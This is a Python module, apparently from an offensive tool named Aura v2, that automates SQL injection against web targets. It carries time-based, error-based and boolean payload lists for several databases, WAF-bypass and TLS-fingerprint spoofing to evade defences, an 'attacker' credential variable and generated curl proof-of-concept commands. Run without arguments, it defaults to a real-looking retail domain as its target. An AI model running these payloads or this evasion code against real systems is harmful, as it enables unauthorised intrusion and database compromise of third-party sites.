"""
Aura v2 — SQL Injection Detection Engine
==========================================
Detects SQLi vulnerabilities using three complementary techniques:

  1. Time-Based Blind SQLi  — Most reliable. Injects SLEEP()/WAITFOR DELAY and
                              measures response time. Works even if output is hidden.
  2. Error-Based SQLi       — Looks for database error strings in the response.
                              Fastest: one request per payload.
  3. Boolean-Based SQLi     — Compares response size/content for TRUE vs FALSE payloads.

WAF Bypass:
  - Comment variations: --, #, /*!...*/
  - Whitespace substitution: %09, %0a, %0d
  - Case mixing: SeLeCt, WaItFoR
  - URL/double encoding

Usage:
    aura www.target.com --sqli
    aura www.target.com --sqli --map reports/discovery_map_target.json
"""

import json
import os
import re
import time
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import urllib3
from curl_cffi import requests as curlr
urllib3.disable_warnings()

from aura.core.brain import AuraBrain
from aura.core.genetic_bypass import GeneticWAFBypass
from aura.ui.zenith_ui import ZenithUI

# ─── Payload Libraries ────────────────────────────────────────────────────────

# Time-based payloads per DB (SLEEP delay = 5 seconds)
TIMEBASED_PAYLOADS = {
    "MySQL":      ["' AND SLEEP(5)--", "1 AND SLEEP(5)--", "' OR SLEEP(5)--",
                   "'; SLEEP(5)--", "1'; SLEEP(5)-- -"],
    "MSSQL":      ["'; WAITFOR DELAY '0:0:5'--", "' AND 1=1; WAITFOR DELAY '0:0:5'--",
                   "1; WAITFOR DELAY '0:0:5'--"],
    "Oracle":     ["' AND 1=1 AND ROWNUM=1 AND (SELECT COUNT(*) FROM ALL_USERS)>0 AND SLEEP(5)--",
                   "' OR 1=1 AND (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual) IS NOT NULL--"],
    "PostgreSQL": ["'; SELECT pg_sleep(5)--", "' AND 1=1; SELECT pg_sleep(5)--",
                   "1; SELECT pg_sleep(5)--"],
}

# Error-based signatures — if these appear in the response, SQLi is likely
ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"unclosed quotation mark after the character string",
    r"mysql_fetch_array\(\)",
    r"\[MySQL\]",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"sqlserver",
    r"unclosed quotation mark",
    r"incorrect syntax near",
    r"\[Microsoft\]\[ODBC",
    # Oracle
    r"ora-\d{5}",
    r"oracle error",
    r"oracle.*driver",
    # PostgreSQL
    r"psql error",
    r"pg_query\(\)",
    r"postgresql.*error",
    # Generic
    r"sqlite_master",
    r"syntax error.*sql",
    r"sql syntax.*error",
    r"invalid query",
    r"db2 sql error",
]
ERROR_PATTERN = re.compile("|".join(ERROR_SIGNATURES), re.IGNORECASE)

# Boolean payloads (TRUE vs FALSE comparison)
BOOL_TRUE_PAYLOADS  = ["' AND '1'='1", "' AND 1=1--", "1 AND 1=1"]
BOOL_FALSE_PAYLOADS = ["' AND '1'='2", "' AND 1=2--", "1 AND 1=2"]

# WAF bypass wrappers
WAF_BYPASS_COMMENTS = ["--", "#", "-- -", "/**/", "/*!*/"]
WAF_BYPASS_SPACES   = ["+", "%20", "%09", "%0a", "/**/"]

SKIP_EXTENSIONS = re.compile(r'\.(css|js|png|jpg|gif|svg|ico|woff|ttf|webp)$', re.I)
SKIP_PARAMS = {"page", "lang", "locale", "currency", "format", "sort", "order", "view"}

TIME_DELAY = 5       # seconds to sleep for time-based
TIME_THRESHOLD = 4.0 # minimum seconds we accept as "confirmed delay"


class SQLiEngine:
    """
    Automated SQL injection detection engine.
    Combines time-based, error-based, and boolean detection.
    """

    def __init__(
        self,
        target: str,
        cookies_str: str,
        output_dir: str = "./reports",
        timeout: int = 20,
        proxy: Optional[str] = None,
    ):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies = self._parse_cookies(cookies_str)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout = timeout
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.findings: list[dict] = []
        self.tested: set[str] = set()

    @staticmethod
    def _parse_cookies(cookie_str: str) -> dict:
        cookies = {}
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies[k.strip()] = v.strip()
        return cookies

    def _request(self, method: str, url: str, timeout: Optional[int] = None, original_payload: Optional[str] = None) -> tuple[Optional[curlr.Response], float]:
        """Makes a request, wrapped in the AI Genetic Mutation Loop."""
        t0 = time.monotonic()
        
        # We simulate a "session" object that the GeneticWAFBypass expects
        class DummySession:
            def __init__(self, cookies, parent_timeout):
                self.cookies = cookies
                self.timeout = parent_timeout
            async def request(self, req_method, req_url, **kwargs):
                return curlr.request(
                    method=req_method,
                    url=req_url,
                    cookies=self.cookies,
                    timeout=kwargs.get("timeout", self.timeout),
                    verify=False,
                    allow_redirects=True,
                    impersonate="chrome124", 
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
                    **{k:v for k,v in kwargs.items() if k not in ["timeout", "original_payload"]}
                )

        import asyncio
        brain = AuraBrain()
        waf_bypass = GeneticWAFBypass(brain, DummySession(self.cookies, timeout or self.timeout))

        try:
            if original_payload:
                # Use the AI bypass loop
                response, was_bypassed = asyncio.run(waf_bypass.bypass_and_retry(
                    method, 
                    url, 
                    original_payload=original_payload
                ))
                resp = response
            else:
                # Standard stealth request
                resp = curlr.request(
                method=method,
                url=url,
                cookies=self.cookies,
                timeout=timeout or self.timeout,
                verify=False,
                allow_redirects=True,
                impersonate="chrome124",  # v6.0 TLS JA3/JA4 Spoofing
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
            )
            elapsed = time.monotonic() - t0
            return resp, elapsed
        except curlr.RequestsError:
            elapsed = time.monotonic() - t0
            return None, elapsed
        except Exception:
            return None, 0.0

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Replaces the value of `param` in `url` with `payload`."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _extract_params(self, discovery_map: dict) -> list[dict]:
        """Extracts injectable parameters from all API calls in the discovery map."""
        all_calls = (
            discovery_map.get("all_api_calls", []) +
            discovery_map.get("idor_candidates", []) +
            discovery_map.get("mutating_endpoints", [])
        )

        # Add common test paths
        test_urls = [
            f"{self.target}/search?q=test",
            f"{self.target}/products?name=test&category=test",
            f"{self.target}/api/v1/search?query=test",
            f"{self.target}/api/v2/search?q=test",
        ]
        for u in test_urls:
            all_calls.append({"url": u, "method": "GET"})

        injectable = []
        seen = set()

        for call in all_calls:
            url = call.get("url", "")
            if SKIP_EXTENSIONS.search(url):
                continue
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            for param_name, values in params.items():
                if param_name.lower() in SKIP_PARAMS:
                    continue
                key = (parsed.path, param_name)
                if key in seen:
                    continue
                seen.add(key)
                injectable.append({
                    "url": url,
                    "method": call.get("method", "GET"),
                    "param": param_name,
                    "original_value": values[0] if values else "",
                })

        return injectable

    def _test_error_based(self, url: str, param: str) -> Optional[dict]:
        """Injects error-triggering payloads and checks response for DB error signatures."""
        error_payloads = ["'", '"', "\\", "1'1", "' OR ''='"]
        for payload in error_payloads:
            injected_url = self._inject_param(url, param, payload)
            resp, _ = self._request("GET", injected_url, original_payload=payload)
            if resp and ERROR_PATTERN.search(resp.text):
                db_type = "Unknown"
                for err_pattern in ERROR_SIGNATURES:
                    if re.search(err_pattern, resp.text, re.IGNORECASE):
                        if "mysql" in err_pattern: db_type = "MySQL"
                        elif "mssql" in err_pattern or "microsoft" in err_pattern: db_type = "MSSQL"
                        elif "ora-" in err_pattern: db_type = "Oracle"
                        elif "postgresql" in err_pattern or "pg_" in err_pattern: db_type = "PostgreSQL"
                        break

                # Extract snippet of the error
                match = ERROR_PATTERN.search(resp.text)
                snippet = resp.text[max(0, match.start()-30):match.end()+80].strip() if match else ""

                return {
                    "method": "Error-Based SQLi",
                    "payload": payload,
                    "db_type": db_type,
                    "error_snippet": snippet,
                    "severity": "CRITICAL",
                    "cvss_score": 9.8,
                }
        return None

    def _test_boolean_based(self, url: str, param: str) -> Optional[dict]:
        """Compares TRUE vs FALSE responses to detect boolean-based SQLi."""
        # Get baseline
        original_url = self._inject_param(url, param, "1")
        baseline, _ = self._request("GET", original_url)
        if not baseline:
            return None
        baseline_len = len(baseline.text)

        results = []
        for true_p, false_p in zip(BOOL_TRUE_PAYLOADS, BOOL_FALSE_PAYLOADS):
            true_url  = self._inject_param(url, param, true_p)
            false_url = self._inject_param(url, param, false_p)

            true_resp,  _ = self._request("GET", true_url, original_payload=true_p)
            false_resp, _ = self._request("GET", false_url, original_payload=false_p)

            if not true_resp or not false_resp:
                continue

            true_len  = len(true_resp.text)
            false_len = len(false_resp.text)

            # TRUE should match baseline, FALSE should differ significantly
            true_matches_baseline  = abs(true_len - baseline_len) < 50
            false_differs = abs(false_len - true_len) > 100

            if true_matches_baseline and false_differs:
                results.append((true_p, false_p, true_len, false_len))

        if results:
            t_payload, f_payload, t_len, f_len = results[0]
            return {
                "method": "Boolean-Based Blind SQLi",
                "payload_true": t_payload,
                "payload_false": f_payload,
                "response_len_true": t_len,
                "response_len_false": f_len,
                "db_type": "Unknown",
                "severity": "HIGH",
                "cvss_score": 8.8,
            }
        return None

    def _test_time_based(self, url: str, param: str) -> Optional[dict]:
        """
        v30.0 OMEGA: Adaptive Triple-Pass Verification.
        Eliminates network lag false positives by verifying scaling.
        1. SLEEP(5) -> 2. SLEEP(2) -> 3. Control (0s)
        """
        # Baseline request
        baseline_url = self._inject_param(url, param, "1")
        _, baseline_time = self._request("GET", baseline_url)

        for db_name, payloads in TIMEBASED_PAYLOADS.items():
            for payload_template in payloads[:1]:
                # --- PASS 1: Long Sleep (5s) ---
                p5 = payload_template.replace("5", "5")
                url5 = self._inject_param(url, param, p5)
                _, t5 = self._request("GET", url5, timeout=15)
                
                if (t5 - baseline_time) >= 4.0:
                    # --- PASS 2: Short Sleep (2s) ---
                    # We expect around 2s delay
                    p2 = payload_template.replace("5", "2")
                    url2 = self._inject_param(url, param, p2)
                    _, t2 = self._request("GET", url2, timeout=10)
                    
                    if 1.5 <= (t2 - baseline_time) <= 3.5:
                        # --- PASS 3: Control Pass (No Sleep) ---
                        # We expect near-baseline performance
                        p0 = "1" # Constant value
                        url0 = self._inject_param(url, param, p0)
                        _, t0 = self._request("GET", url0, timeout=10)
                        
                        if (t0 - baseline_time) < 1.0:
                            # ALL PASSES SUCCESSFUL -> 100% CONFIRMED HIT
                            return {
                                "method": "Time-Based Blind SQLi (Triple-Pass Verified)",
                                "payload": p5,
                                "db_type": db_name,
                                "observed_delay_5s": round(t5, 2),
                                "observed_delay_2s": round(t2, 2),
                                "severity": "CRITICAL",
                                "cvss_score": 9.8,
                                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
                            }
        return None

    def test_parameter(self, param_info: dict) -> Optional[dict]:
        """Tests a single parameter with all three SQLi techniques."""
        url    = param_info["url"]
        param  = param_info["param"]

        dedup_key = f"{urllib.parse.urlparse(url).path}::{param}"
        if dedup_key in self.tested:
            return None
        self.tested.add(dedup_key)

        with ZenithUI.status(f"Injecting payloads into {param} in {url[:50]}..."):
            # 1. Error-based (fastest)
            result = self._test_error_based(url, param)
            if result:
                ZenithUI.finding(f"Error-Based SQLi ({result['db_type']})", result['severity'], self.target_domain)
                finding = self._build_finding(param_info, result)
                self.findings.append(finding)
                return finding

            # 2. Boolean-based
            result = self._test_boolean_based(url, param)
            if result:
                ZenithUI.finding(f"Boolean-Based SQLi", result['severity'], self.target_domain)
                finding = self._build_finding(param_info, result)
                self.findings.append(finding)
                return finding

            # 3. Time-based (slowest but most reliable)
            result = self._test_time_based(url, param)
            if result:
                ZenithUI.finding(f"Time-Based SQLi ({result['db_type']})", result['severity'], self.target_domain)
                finding = self._build_finding(param_info, result)
                self.findings.append(finding)
                return finding

        return None

    def _build_finding(self, param_info: dict, result: dict) -> dict:
        """Assembles the complete finding dict."""
        return {
            "type": f"SQL Injection — {result['method']}",
            "url": param_info["url"],
            "param": param_info["param"],
            "http_method": param_info["method"],
            "sqli_method": result["method"],
            "db_type": result.get("db_type", "Unknown"),
            "payload": result.get("payload") or result.get("payload_true"),
            "severity": result["severity"],
            "cvss_score": result["cvss_score"],
            "cvss_vector": result.get("cvss_vector", "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"),
            "owasp": "A03:2021 — Injection",
            "error_snippet": result.get("error_snippet", ""),
            "observed_delay_sec": result.get("observed_delay_sec"),
            "poc_curl": (
                "curl -sk '{}' -b '{}'".format(
                    self._inject_param(param_info['url'], param_info['param'], result.get('payload', "\\' OR 1=1--")),
                    "; ".join(f"{k}={v}" for k, v in list(self.cookies.items())[:2])
                )
            ),
            "timestamp": datetime.utcnow().isoformat(),
        }

    def run(self, discovery_map: dict) -> list[dict]:
        """Main SQLi scan runner."""
        params = self._extract_params(discovery_map)
        meta = discovery_map.get("meta", {})

        print(f"\n{'='*65}")
        print(f"🟠 AURA v2 — SQL Injection Engine")
        print(f"🎯 Target: {meta.get('target', self.target)}")
        print(f"💉 Parameters to Test: {len(params)}")
        print(f"🔧 Techniques: Error-Based → Boolean → Time-Based")
        print(f"{'='*65}")

        if not params:
            print("\n⚠️  No injectable parameters found.")
            print("   Tip: Run --crawl or --burp first to discover endpoints with query parameters.")
            return []

        for param_info in params:
            self.test_parameter(param_info)

        return self._finalize()

    def _finalize(self) -> list[dict]:
        critical = [f for f in self.findings if f.get("severity") == "CRITICAL"]
        high     = [f for f in self.findings if f.get("severity") == "HIGH"]

        print(f"\n{'='*65}")
        print(f"✅ SQLi SCAN COMPLETE")
        print(f"{'='*65}")
        print(f"  🚨 Critical (CVSS 9+) : {len(critical)}")
        print(f"  🟠 High    (CVSS 8+)  : {len(high)}")
        print(f"  📊 Total              : {len(self.findings)}")

        if self.findings:
            for i, f in enumerate(self.findings, 1):
                print(f"\n  [{i}] [{f['severity']}] {f['type']}")
                print(f"       Param: {f['param']} in {f['url'][:65]}")
                print(f"       DB: {f['db_type']} | CVSS: {f['cvss_score']}")
                print(f"       PoC: {f['poc_curl'][:120]}")

            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"sqli_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as fh:
                json.dump({"target": self.target, "findings": self.findings}, fh, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
            print(f"  ➡️  Next: aura --report {out_path}")
        else:
            print("\n  ✅ No SQL injection vulnerabilities detected.")

        return self.findings


def run_sqli_scan(target: str, discovery_map_path: Optional[str] = None) -> list[dict]:
    """CLI runner for `aura <target> --sqli`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    if not cookies_str:
        print("⚠️  AUTH_TOKEN_ATTACKER not set — running unauthenticated SQLi scan.")

    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)
        else:
            # Run with empty map (will test common paths anyway)
            discovery_map_path = None

    discovery_map = {}
    if discovery_map_path:
        with open(discovery_map_path, encoding="utf-8-sig") as f:
            discovery_map = json.load(f)

    engine = SQLiEngine(target=target, cookies_str=cookies_str)
    return engine.run(discovery_map)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_sqli_scan(target)
